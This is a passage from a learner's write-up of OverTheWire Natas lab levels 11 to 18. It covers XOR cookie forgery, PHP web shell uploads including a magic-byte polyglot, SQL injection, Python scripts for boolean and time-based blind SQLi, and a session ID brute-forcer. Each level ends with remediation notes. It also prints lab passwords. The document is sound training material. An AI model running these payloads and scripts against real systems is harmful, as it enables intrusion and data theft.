		- This is due to `Ciphertext = Plaintext XOR Key`, therefore, `Key = Ciphertext XOR Plaintext`.
		- The CyberChef recipe used: https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)XOR(%7B'option':'UTF8','string':'%7B%22showpassword%22:%22no%22,%22bgcolor%22:%22%23ffffff%22%7D'%7D,'Standard',false)&input=SG1Za0J3b3pKdzRXTnlBQUZ5QjFWVWNxT0UxSlpqVUlCaXM3QUJkbWJVMUdJakVKQXlJeFRSZz0&ieol=CRLF
	5. Constructed my desired plaintext by creating the target JSON string: `{"showpassword":"yes","bgcolor":"#ffffff"}`.
	6. Encrypted new plaintext using CyberChef to XOR the desired plaintext with the derived key `eDWo`, then `To Base64`. This generated the new cookie value: `HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5WmU=`. 
		- The CyberChef recipe used: https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'UTF8','string':'eDWo'%7D,'Standard',false)To_Base64('A-Za-z0-9%2B/%3D')&input=eyJzaG93cGFzc3dvcmQiOiJ5ZXMiLCJiZ2NvbG9yIjoiI2ZmZmZmZiJ9DQo&ieol=CRLF
	7. Injected the new cookie and reloaded the page to reveal the password for Natas12: `yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`.

**Rabbit Holes & Overcoming Adversity**
- **Failed Attempt:** When using CyberChef for the XOR operation, I initially didn't specify `UTF8` encoding for the plaintext input. This resulted in completely different and incorrect key being derived.
- **Why it Failed:** Character encoding is crucial in byte-level operations like XOR since the operation is performed on raw bytes. 
- **Overcoming Adversity**: I did more research on how XOR operates on characters and realised that inconsistent character encodings could cause the byte values to differ, making the results invalid. 
- **What I Learned:** This highlighted the importance of understanding and consistently applying character encodings when performing cryptographic operations.

**Vulnerability & Real-World Impact**
- **Root Cause:** The use of a simple, static, and repeating XOR cipher for "encryption" of client-side data. This type of cipher is highly susceptible to known-plaintext attacks. If an attacker knows any portion of the plaintext that corresponds to a portion of the ciphertext, they can deduce the XOR key.
- **Real-World Scenario:** A desktop application that uses a hardcoded, client-side XOR "encryption" to protect user preferences (e.g., "premium features unlocked," "admin status"). An attacker could decompile the application, identify the key or a known plaintext, and then forge preferences to gain unauthorised access or benefits.
- **Risk:** High, it leads to data tampering, privilege escalation as seen here with `showpassword`, and bypass of application logic. If sensitive information were stored in these cookies, it could lead to data exposure.

**Remediate & Security Engineering Principles**
- **Remediation**: Do not rely on client-side "encryption" for sensitive application state. Store such state securely on the server side (e.g., in a session database).
- **Principle Illustrated:** Defence in Depth, don't rely on a single, weak layer of client-side crypto.

**Personal Reflection & Growth**
- **What I Found Challenging:** As someone new to PHP, analysing the provided source code was particularly challenging. It required careful step-by-step examination to logically piece together how the `xor_encrypt` function worked, how the `loadData` and `saveData` functions interacted, and ultimately, how the cookie value was generated and processed. This initial code comprehension was crucial before even considering the cryptographic aspects.
- **Connecting to Future Challenges:** This challenge strengthened my understanding of cryptographic weaknesses, especially known-plaintext attacks. I've learned to be sceptical of client-side "encryption" and for projects of this nature will prioritise code review to identify key derivation or data manipulation opportunities.
- **Growth:** It improved my practical cryptanalysis skills and highlighted the importance of using strong, vetted cryptography.

---

## Level 11 → Level 12
**Vulnerability**: File Upload Vulnerability (Client-Side Validation Bypass)
```PHP
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
        $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else {
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
    <input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
    Choose a JPEG to upload (max 1KB):<br/>
    <input name="uploadedfile" type="file" /><br />
    <input type="submit" value="Upload File" />
</form>

<?php } ?>
```
**Thought Process**: The page states "Choose a JPEG to upload (max 1KB):" and allows you to upload a file. In the source I noted the `filesize($_FILES['uploadedfile']['tmp_name']) > 1000` condition was the only validation present in the backend. My immediate thought was to upload a small malicious PHP web shell to achieve Remote Code Execution (RCE). 
**Methodology & Execution**
- **Tools Used:** Browser developer tools (Inspect Element), `attack.php` (custom PHP shell).
- **Step-by-Step Execution:**
	1. Conducted initial reconnaissance and uploaded a harmless 1x1 pixel PNG file. The server responded with "The file `upload/qop0wo1izz.jpg` has been uploaded," and the file extension was surprisingly changed from `.png` to `.jpg`.
	2. Analysed the PHP source code. The `if(filesize(...) > 1000)` confirmed the 1KB size limit, which was the only validation condition present. The crucial part for file naming was the `makeRandomPathFromFilename("upload", $_POST["filename"])` function. I noted that this function extracts the extension using `$ext = pathinfo($fn, PATHINFO_EXTENSION);` where `$fn` is directly taken from `$_POST["filename"]`.
	3. Identified the hidden input `<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />` in the form. This revealed that the server was taking the filename and extension from this client-side hidden input, not from the actual uploaded file's original name. The `.jpg` extension was hardcoded here, explaining the previous `.png` to `.jpg` conversion.
	4. Crafted my payload `attack.php` containing `<?php passthru("cat /etc/natas_webpass/natas13"); ?>`.
	5. Bypassed client-side control using Inspect Element to modify the value attribute of the hidden input field:
	    - Original: `<input type="hidden" name="filename" value="8fitbdimc3.jpg">`
	    - Modified: `<input type="hidden" name="filename" value="8fitbdimc3.php">`
	6. Uploaded the `attack.php` file using the modified form. The server responded with "The file `upload/tquqhokqi4.php` has been uploaded." Clicking the provided hyperlink (`http://natas12.natas.labs.overthewire.org/upload/tquqhokqi4.php`) executed the PHP payload, revealing the password for Natas13: `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`.


**Rabbit Holes & Overcoming Adversity**
- **Failed Attempt:** My initial attempt was to upload `attack.php` to the server. I expected it to be saved with a `.php` extension and execute. However, after the upload, the server reported that a `.jpg` and navigating to this URL did not execute my PHP code, instead showing it as a broken image. This kept me stuck for hours.
- **Why it Failed:** The server-side logic was taking the extension from the `$_POST["filename"]` hidden input, which was hardcoded to `.jpg` on the form. So, even if I uploaded `attack.php`, the server would save it as `[randomstring].jpg`, preventing its execution as PHP code. This kept me stuck for hours as the file appeared to upload correctly but wouldn't execute.
- **Overcoming Adversity:** Realizing that the server was blindly trusting the filename parameter from the client-side hidden input field for determining the file's extension, rather than deriving it from the uploaded file itself. This meant the client could dictate the final extension.
- **What I Learned:** This failure highlighted the distinction between client-side (easily manipulable) and server-side (authoritative) processing. It taught me to always meticulously analyse how server-side functions like `pathinfo` are being fed their input, especially when that input originates from the client.


**Vulnerability & Real-World Impact**
- **Root Cause:** The application's reliance on client-supplied data (the filename hidden input) to determine the uploaded file's extension on the server side. There was no server-side validation of the actual file's content or its original extension against the desired extension, leading to an insecure file naming mechanism.
- **Real-World Scenario:** A social media site allowing users to upload profile pictures or documents might use a similar flawed logic. If a hidden field or a JavaScript-controlled parameter dictates the file extension on the server, an attacker could intercept and modify this parameter to upload a web shell (`.php`) disguised as an image, gaining full control over the server.
- **Risk:** High, this vulnerability directly leads to RCE, allowing an attacker to run arbitrary commands on the server. This can result in complete system compromise, data theft, or using the server as a pivot point for further attacks.

**Remediate & Security Engineering Principles**
- **Remediation**: Use strict whitelisting to only allow specific, safe file types (e.g., `jpg`, `png`, `gif`) and validate the file's actual MIME type (e.g., using `finfo_file` in PHP) and magic bytes, not just its extension. Store files outside of web root or isolate uploads on a separate file server or CDN. OWASP has a good cheat sheet for secure file uploads. https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- **Principle Illustrated:** Never Trust User Input is violated here. The application trusted client-side input for a security-critical decision. Also, Defence in Depth (multiple layers of validation are needed for file uploads, not just size), and Principle of Least Privilege (the upload mechanism was granted too much control over file naming).

**Personal Reflection & Growth**
- **What I Found Challenging:** The most challenging aspect was getting stuck on the `makeRandomPathFromFilename` function and the hardcoded `.jpg` extension for hours. My initial focus was purely on the uploaded file's extension, overlooking the hidden input field's role. It was a case of tunnel vision, where the obvious (modifying HTML in the browser) was missed due to overthinking the server-side file handling.
- **Connecting to Future Challenges:** This experience emphasised the importance of examining all client-side inputs, including seemingly innocuous hidden fields, and cross-referencing them with server-side logic. I will now always consider how client-side elements might influence server-side decisions, especially in file upload scenarios.
- **Growth:** This challenge solidified my understanding of the distinction between client-side and server-side validation and the implications of relying on client-controlled data for security-sensitive operations. It reinforced the need for meticulous code review and testing to uncover such bypasses.
---
## Level 12 → Level 13
**Vulnerability**: File Upload Vulnerability (Magic Byte Bypass)
```PHP
if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```
**Thought Process**: The page was the same as Natas12 but with the addition of the text "For security reasons, we now only accept image files!" Inspecting the source code I immediately noticed that there was additional validation (`else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name']))`). The PHP manual stated the function `exif_imagetype()` was used to determine the image type by inspecting the first few bytes of a file. I searched how these bytes could determine the image type and `exif_imagetype` bypasses leading to my understanding of magic bytes in files can be used to recognise a file and how I could craft a payload to exploit this. 

**Methodology & Execution**
- **Tools Used:** Notepad++, Browser Developer Tools, `payload.jpeg`
- **Step-by-Step Execution:**
	1. Identified new validation in the line `else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) { echo "File is not an image"; }`.
	2. Researched `exif_imagetype` and found that the hexadecimal signature for a JPEG file is `FF D8 FF E0`. This translates to `ÿØÿà` in ISO 8859-1 encoding.
	3. Crafted the payload, modified a JPEG file and replaced its contents with:
	```PHP
	ÿØÿà 
	<?php passthru("cat /etc/natas_webpass/natas14");?>
	```
	4. Recalled the `input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />` vulnerability from Natas12 and re-used the bypass to modify the `value` attribute to `.php`.
	5. Uploaded the `payload.jpeg` file to the modified form. The server responded with "The file `upload/5sj7t9byhs.php` has been uploaded" ang going to the link executed the embedded PHP code. The password for Natas14: `z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`.

**Rabbit Holes & Overcoming Adversity**
- **Failed Attempt:** I tried reusing my `attack.php` from Natas12, which was just PHP code. 
- **Why it Failed:** It failed due to the new `exif_imagetype` check.
- **Overcoming Adversity**: Successfully combining the magic byte trick with the hidden field manipulation. Realising that `exif_imagetype` only checks the beginning of the file, allowing arbitrary code to follow.
- **What I Learned:** This challenge deepened my understanding of file signature checks and the concept of "polyglot" files. It showed that simple checks like `exif_imagetype` can be bypassed if they are not combined with more thorough content validation. It reinforced that just adding a check isn't enough and one must understand its limitations.

**Vulnerability & Real-World Impact**
- **Root Cause:** Weak validation as `exif_imagetype()` only checks the file's magic bytes, not the full content which led to PHP code being hidden. 
- **Real-World Scenario:**  A social media site allowing users to upload profile pictures or documents might use `exif_imagetype` for validation. An attacker could upload a web shell disguised as an image. If it's stored in a web-accessible folder with a `.php` extension, the attacker can trigger remote code execution (RCE).
- **Risk:** High, it leads to RCE, allowing an attacker to run arbitrary commands on the server, resulting in a complete system compromise, data theft or using the server as a pivot point for further attacks.

**Remediate & Security Engineering Principles**
- **Remediation**: Use multi-layered validation and implement all possible validation steps like magic bytes, extension whitelisting. Store files outside of web root or isolate uploads on a separate file server or CDN.
- **Principle Illustrated:** Defence in Depth as relying on a single, easily bypassed check like `exif_imagetype` is insufficient. Never Trust User Input, you should not trust client-supplied extensions or filenames.

**Personal Reflection & Growth**
- **What I Found Challenging:** The challenge was straightforward after understanding `exif_imagetype`'s behavior and how to craft a file that satisfies both the image signature check and allows for PHP execution.
- **Connecting to Future Challenges:** It cemented my understanding of advanced file upload bypass techniques, particularly magic byte manipulation and polyglot files. This knowledge will be useful when encountering file upload forms and analysing how file content is truly validated.
- **Growth:** This challenge deepened my appreciation for the complexity of secure file handling and the various ways attackers can bypass such validation. It also highlighted nuances of file formats, interpreter behaviours, and the data flow from client to server.


---
## Level 13 → Level 14
**Vulnerability**: SQL Injection (Authentication Bypass)
```PHP
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>
```
**Thought Process**: Upon viewing the source code, the presence of `mysqli_connect`, `mysqli_select_db`, and a query string constructed directly with `$_REQUEST["username"] and $_REQUEST["password"]` immediately indicated a SQL Injection vulnerability.
**Methodology & Execution**
- **Tools Used:** Browser
- **Step-by-Step Execution:**
	Submitted my payload `" OR 1=1 -- -` in the `username` field, resulting in Natas15 password: `SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`.

**Rabbit Holes & Overcoming Adversity**
- **Failed Attempt:** N/A
- **Why it Failed:** N/A
- **Overcoming Adversity**: N/A
- **What I Learned:** N/A

**Vulnerability & Real-World Impact**
- **Root Cause:** The direct concatenation of unsanitised user-supplied input (`$_REQUEST["username"] and $_REQUEST["password"]`) into an SQL query string. This allows an attacker to manipulate the query's logic by injecting malicious SQL syntax. 
- **Real-World Scenario:** An attacker could bypass login on an e-commerce site, accessing admin panels and sensitive user data like credit cards.
- **Risk:** High since it leads to complete authentication bypass and unauthorised access to sensitive data.

**Remediate & Security Engineering Principles**
- **Remediation**: Implement prepared statements with parameterised queries. This approach separates the SQL query logic from the user-supplied data, ensuring that the input is treated purely as data and not as executable code. PHP's `mysqli_prepare()` is an example.
- **Principle Illustrated:** Input Validation as all input must be validated and sanitised. Secure by Design as using prepared statements prevents this entire class of vulnerability at an architectural level and Never Trust User Input.

**Personal Reflection & Growth**
- **What I Found Challenging:** Nothing, the challenge was straightforward.
- **Connecting to Future Challenges:** N/A
- **Growth:** Reinforced the need of using prepared statements to prevent this type of vulnerability.
---

## Level 14 → Level 15
```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
```
**Vulnerability**: Blind SQL Injection (Boolean-based)
**Thought Process**: The page had username input form, my initial instinct was to attempt a classic SQL injection payload like `" OR 1=1 -- -` and I was met with the response "This user exists.". I was expecting to be logged in or have password in the output but it only indicated if a user existed. Reviewing the source code only showed limited outputs which left me stuck on how to extract the actual password. 

**Methodology & Execution**
- **Tools Used:** Browser, Python.
- **Theorizing the Approach:** Faced with the limited "user exists" or "user doesn't exist" output, I realised direct data extraction was not possible. This prompted me to research different types of SQL injection. Reading an article by SentinelOne led me to Blind SQL Injection, particularly the Boolean/content-based type, which perfectly matched this scenario. From this, I theorised that I would have to infer the password character by character based solely on whether the "This user exists" message appeared.
- **Step-by-Step Execution:**
	1. Confirmed the existence of the `natas16` user with the payload `natas16" -- -`, which successfully returned "This user exists."
	2. Probed for the password column and confirmed its existence and the Boolean mechanism: `natas16" AND password ="test" -- -`. This returned "This user doesn't exist." without an error, confirming the column was present and the response was based on the query's truthiness.
	3. Recognised that direct brute-forcing of a 32-character password (comprising uppercase, lowercase, and digits) would be computationally infeasible.
	4. Identified the `LIKE` operator as a method for pattern matching within SQL queries, allowing for character-by-character inference.
	5. Formulated an initial character-by-character inference payload: `natas16" AND password LIKE "a%" -- -`. Manually testing characters confirmed `h` was the first character when `natas16" AND password LIKE "h%" -- -` returned "This user exists."
	6. Developed a Python script to automate this character-by-character brute-force process, appending confirmed characters to `current_password`.
	7. **Self-correction:** Initially, the script produced an all-lowercase password. Recalling that previous Natas passwords contained mixed-case characters and that MySQL's `LIKE` operator can be case-insensitive by default depending on collation, I modified the payload to use `LIKE BINARY` to force case-sensitive comparison.
		```Python
		import requests
		import string
		
		TARGET = 'http://natas15.natas.labs.overthewire.org/index.php'
		AUTH = ('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')
		CHARSET = string.ascii_letters + string.digits
		PASSWORD_LENGTH = 32
		
		current_password = ""
		for i in range(1, PASSWORD_LENGTH + 1):
		    for c in CHARSET:
		        # Using LIKE BINARY for case-sensitive comparison
		        payload = f'natas16" AND password LIKE BINARY "{current_password + c}%" -- -'
		        data = {'username': payload}
		        response = requests.post(TARGET, auth=AUTH, data=data)
		        if "This user exists." in response.text:
		            current_password += c
		            print(f"Found character {i}: {c} - Password so far: {current_password}")
		            break
		print(f"Final password: {current_password}")
		```
	8. Executed the refined script, which successfully extracted the 32-character password: `hPkjKYviLQctEW33QmuXL6eDVfMW4sGo`. The output looked like:
		```Console
		Found character 1: h - Password so far: h
		Found character 2: P - Password so far: hP
		Found character 3: k - Password so far: hPk
		...
		Found character 31: G - Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4sG
		Found character 32: o - Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
		Final password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
		```

	My "Aha!" moment was when I realised that the application's simple "This user exists." / "This user doesn't exist." response was a powerful Boolean mechanism, allowing for the inference of data through character-by-character probing. The subsequent "aha" was recognising the crucial need for `LIKE BINARY` to handle case sensitivity correctly, which was needed for the password's accuracy.

**Rabbit Holes & Overcoming Adversity**
- **Failed Attempt:** Initially trying `OR 1=1 -- -` and expecting a login bypass or direct data dump.
- **Why it Failed:** The application's design was not for authentication but merely for checking user existence. The `mysqli_num_rows($res) > 0` logic only provided a Boolean True/False based on the query's success, not direct data output.
- **Overcoming Adversity**: Recognising this constraint forced me to research different injection tactics and switch from classic injection to blind SQL injection (Boolean-based), where data is inferred bit by bit from the true/false responses.
- **What I Learned:** This forced a pivot from direct exploitation to an inferential approach, highlighting the importance of understanding the application's specific response mechanism in SQL injection scenarios.
- **Failed Attempt 2:** Using the `LIKE` operator without `BINARY` resulted in an incorrect, all-lowercase password.
- **Why it Failed 2:** MySQL's `LIKE` operator is often case-insensitive by default depending on the collation. Previous Natas passwords contained mixed-case characters, leading to an incorrect result when entered into the next level.
- **Overcoming Adversity 2**: I researched and discovered the `LIKE BINARY` clause, which forces case-sensitive matching. Updating the payload to use this ensured the exact password.
- **What I Learned 2:** This emphasised the importance of understanding database-specific syntax and default behaviours. It also highlighted the need for rigorous verification of extracted data, especially when dealing with inferred information, and debugging the subtle differences in SQL operators.

**Vulnerability & Real-World Impact**
- **Root Cause:** Improper sanitization of user-supplied input `($_REQUEST["username"])` concatenated directly into a SQL query string without prepared statements or proper escaping. This allowed an attacker to manipulate the query's logic.
- **Real-World Scenario:** A customer support portal with a "check order status" feature that uses an order ID to query a database. An attacker could inject malicious SQL into the order ID field to enumerate sensitive customer data like credit card numbers, addresses or administrator credentials, even if direct output is not provided.
- **Risk:** High, while not immediately leading to a shell, Boolean-based blind SQL injection allows for full data exfiltration from the database. This can lead to significant data breaches, compliance violations, and reputational damage for an organisation.

**Remediate & Security Engineering Principles**
- **Remediation**: Implement prepared statements with parameterised queries using `mysqli_prepare()`. This separates the SQL code from user-supplied data, preventing injection attacks regardless of the input content.
- **Principle Illustrated:** Input Validation as all input must be validated and sanitised. Secure by Design as using prepared statements prevents this entire class of vulnerability at an architectural level and Never Trust User Input.

**Personal Reflection & Growth**
- **What I Found Challenging:** The initial confusion of not getting direct output or a full bypass, which required a conceptual shift to blind injection. Debugging the `LIKE` vs. `LIKE BINARY` issue and understanding database collation was also a valuable, albeit initially frustrating, learning experience.
- **Connecting to Future Challenges:** This challenge solidified my understanding of different SQL injection types especially blind SQLi, and the importance of analysing application responses for subtle cues. It also reinforced the need to consider database-specific behaviours (like case sensitivity of `LIKE`) and the necessity of verifying extracted data against known patterns.
- **Growth:** I gained practical experience in automating exploitation, developing a systematic approach to inferring data, and debugging environmental factors (like database collation). This significantly deepened my appreciation for robust input handling and the limitations of simple blacklisting.
---

## Level 16 → Level 17
**Vulnerability**: Blind SQL Injection (Time-based) https://www.vaadata.com/blog/what-is-blind-sql-injection-attack-types-exploitations-and-security-tips/ https://www.sentinelone.com/cybersecurity-101/cybersecurity/sql-injection/#5-blind-sql-injection
**Thought Process**: The page was the same as Natas15, the PHP source code showed the `echo` statements from Natas15 were commented out, my initial `OR 1=1 -- -` payload yielded no visible output in the browser. This lack of any feedback ("This user exists." or "This user doesn't exist.") made me initially confused as the Boolean mechanism I relied on in Natas15 was gone. I needed a different method to infer information. Recalling the SentinelOne article on Blind SQL Injection, I revisited the concept of time-based SQLi. This technique involves injecting queries that cause a delay in the server's response if a condition is true. This delay then serves as the mechanism to infer information. Further research, specifically an example from Vaadata.com, solidified this idea with the `OR IF(condition, SLEEP(X), 0) -- -` syntax.
**Methodology & Execution**
- **Tools Used:** Browser, Python
- **Step-by-Step Execution:**
	1. Confirmed the absence of any direct output by submitting `natas18" OR 1=1 -- -`.
	2. Tested the time-based injection concept using the `SLEEP()` function: `natas18" OR IF(1=1, SLEEP(3), 0) -- -`.
	3. Observed the network tab in the browser, the `index.php` request showed a significant delay (around 3 seconds) before completing, confirming that time delays could be used as the mechanism to infer information.
	4. Formulated the core time-based payload for character inference: `natas18" AND BINARY password LIKE '{current_password + c}%'` combined with `IF(..., SLEEP(3), 0)`.
	5. Modified the Natas15 Python script to automate the brute-force process by measuring response times:
	```Python
	import requests
	import string
	import time
	
	TARGET = 'http://natas17.natas.labs.overthewire.org/index.php'
	AUTH = ('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
	CHARSET = string.ascii_letters + string.digits
	PASSWORD_LENGTH = 32
	SLEEP_TIME = 3
	
	current_password = ""
	
	for i in range(1, PASSWORD_LENGTH + 1):
	    for c in CHARSET:
	        # Construct the time-based SQL injection payload using LIKE BINARY
	        # Checks if the 'natas18' password starts with the 'current_password'
	        # found so far, followed by the current character 'c'.
	        # If true, it causes a sleep.
	        payload = (
	            f'" OR IF(username=\'natas18\' AND BINARY password LIKE \'{current_password + c}%\', '
	            f'SLEEP({SLEEP_TIME}), 0)-- -'
	        )
	        data = {'username': payload}
	        start_time = time.time()
	        response = requests.post(TARGET, auth=AUTH, data=data)
	        end_time = time.time()
	        elapsed_time = end_time - start_time
	
	        # Check if the elapsed time indicates a successful sleep (condition was true)
	        if elapsed_time > SLEEP_TIME:
	            current_password += c
	            print(f"Found character {i}: {c} - Password so far: {current_password}")
	            break # Found the character for this position, move to the next position
	
	print(f"Final password: {current_password}")
	```
	6. Executed the script, successfully extracting the 32-character password: `6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`.

The "Aha!" moment was realising that the absence of explicit feedback could still be exploited by observing the time taken for the server to respond, transforming a seemingly impossible scenario into a solvable one through a different type of blind injection.
**Rabbit Holes & Overcoming Adversity**
- **Failed Attempt:** Trying to find any form of output or error message, which were all suppressed.
- **Why it Failed:** The application was specifically designed to prevent any information leakage, commenting out all echo statements. This rendered traditional Boolean-based or error-based injection techniques ineffective.
- **Overcoming Adversity**: I kept trying variations of Boolean-based payloads, hoping to trigger some kind of feedback. Nothing changed, no error messages, no page differences, not even a subtle clue which was frustrating as I wasted valuable time on this. This changed when I did research and realised I needed to use a time-based blind SQLi solution.
- **What I Learned:** It highlighted the necessity of understanding the full spectrum of blind SQL injection techniques. When one a Boolean output is removed, another time delay output might be available, forcing a deeper analytical approach. It also illustrated the importance of observing network traffic and response times, not just visible page content.

**Vulnerability & Real-World Impact**
- **Root Cause:** Identical to Natas 15: unvalidated user input `($_REQUEST["username"])` directly concatenated into a SQL query string. The developers attempted to mitigate information leakage by commenting out echo statements, but this only shifted the attack vector from Boolean-based to time-based, not preventing the underlying injection.
- **Real-World Scenario:** A web application with a "forgot password" feature that checks if a username exists, but without any direct output. An attacker could use time-based injection to enumerate valid usernames or even infer password hashes character by character, leading to account compromise or data breaches. 
- **Risk:** High, as time-based blind SQL injection allows for full data exfiltration from the database, albeit slowly. 

**Remediate & Security Engineering Principles**
- **Remediation**: Implement prepared statements with parameterised queries using `mysqli_prepare()`. This separates the SQL code from user-supplied data, preventing injection attacks regardless of the input content.
- **Principle Illustrated:** Defence in Depth, the commented `echos` were a weak layer, easily bypassed. More importantly, Secure by Design, emphasizing that security controls like prepared statements must be built into the application's architecture from the ground up, rather than relying on superficial measures or incomplete sanitisation.

**Personal Reflection & Growth**
- **What I Found Challenging:** The initial challenge was the lack of any visible output. This forced me to expand my understanding of SQL injection beyond direct data retrieval or Boolean responses and consider more subtle side channels.
- **Connecting to Future Challenges:** This challenge helped solidify my understanding of the spectrum of blind SQL injection. It taught me to consider time-based attacks when other methods fail, and to pay close attention to network response times as a potential oracle.
- **Growth:** It highlighted how important automation is in security testing especially in manual time-based blind SQL injection. This highlighted how scripting skills are paramount for exploiting such vulnerabilities efficiently and reliably, especially when dealing with network latency and needing to establish a clear threshold for `SLEEP_TIME`.
---
## Level 17 → Level 18
**Vulnerability**: Session Management (Predictable Session IDs / Session Fixation)
**Thought Process**: The page states "Please login with your admin account to retrieve credentials for natas19.". The challenge likely wasn't SQL injection due to an absence of any SQL statements in the code. The presence of `session` and `cookie` related functions (`my_session_start()`, `session_id()`, `$_SESSION`, `$_COOKIE["PHPSESSID"]`) strongly suggested a session management vulnerability.

Since the goal was to gain admin access, I focused on the `print_credentials()` function, which clearly stated that `$_SESSION["admin"] == 1` was required. However, I quickly noticed the `$_SESSION["admin"] = isValidAdminLogin();` line, where `isValidAdminLogin()` was hardcoded to return 0; (due to a commented-out line). This immediately ruled out logging in as admin via the provided username/password form. My attention then shifted entirely to how session IDs were handled and if they could be manipulated to achieve an admin state.
**Methodology & Execution**
- **Tools Used:** Browser Developer Tools, Python
- **Step-by-Step Execution:**
	1. Code Analysis: 
		1. Confirmed that `isValidAdminLogin()` always returned `0`, making direct login via the form impossible to set `$_SESSION["admin"] = 1`.
		2. Understood the session ID creation: `session_id(createID($_REQUEST["username"]));`
		3. Found the `createID()` vulnerability by dissecting the `createID()` function. It completely ignored the `$user` input and instead used `rand(1, $maxid)` where `$maxid` was a global variable set to 640. This meant session IDs were generated using a simple, low-entropy random number between 1 and 640.
	2. Theorised an attack based on the predictable session ID generation. I guessed that the admin session ID must be one of these 640 possible integers. I could simply brute-force PHPSESSID cookies from 1 to 640 until I found one that corresponded to an existing admin session.
	3. Developed a Python Script to iterate through the possible session IDs:
	```Python
	import requests  
  
	TARGET = 'http://natas18.natas.labs.overthewire.org/index.php'  
	AUTH = ('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')  
	MAX_SESSION_ID = 640  # As found in the source code  
	  
	print("Attempting to brute-force PHPSESSID for Natas18")  
	  
	for session_id in range(1, MAX_SESSION_ID + 1):  
	    # Prepare the cookies dictionary with the current session ID  
	    cookies = {  
	        'PHPSESSID': str(session_id)  
	    }  
	  
	    response = requests.get(TARGET, auth=AUTH, cookies=cookies)  
	  
	    if response:  
	        print(f"  Testing PHPSESSID: {session_id}...")  
	  
	    # Check if the "admin" success message is in the response  
	    if "You are an admin." in response.text:  
	        print(f"\nFound admin PHPSESSID: {session_id}")  
	        print("\nCredentials for Natas19")  
	        # Extract and print the relevant part of the response  
	        start_index = response.text.find("Username: natas19")  
	        end_index = response.text.find("</pre>")  
	        if start_index != -1 and end_index != -1:  
	            print(response.text[start_index:end_index].strip())  
	        else:  
	            print(response.text)  # Fallback if text not found  
	        break  # Stop once the admin session is found  
	else:  
	    print(f"\nFailed to find admin PHPSESSID within the range 1-{MAX_SESSION_ID}")
	```
	
	The script identified the admin session corresponding to `PHPSESSID 119`and extracted Natas19's password `tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr`.

The "Aha!" moment was realising that the commented-out part in `isValidAdminLogin()` was a deliberate misdirection, and the real vulnerability was the highly predictable integer range for session IDs generated by `rand(1, 640)`, making session prediction trivial.

**Rabbit Holes & Overcoming Adversity**
